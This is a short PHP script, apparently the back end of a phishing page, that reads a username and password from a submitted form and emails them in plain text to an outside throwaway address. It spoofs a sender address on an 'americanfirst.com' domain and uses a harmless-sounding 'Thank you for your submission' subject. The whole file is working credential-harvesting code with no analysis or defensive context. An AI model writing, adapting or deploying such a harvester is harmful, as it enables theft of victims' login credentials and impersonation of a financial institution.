<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];
    $email = 'nojeveb444@vikinoko.com';
    
    // Compose the email
    $to = $email;
    $subject = "Thank you for your submission";
    $message = "Username $username password $password";
    $headers = "From: support@americanfirst.com";

    // Send the email
    if (mail($to, $subject, $message, $headers)) {
        echo "Email sent successfully.";
    } else {
        echo "Error sending email.";
    }
}


?>
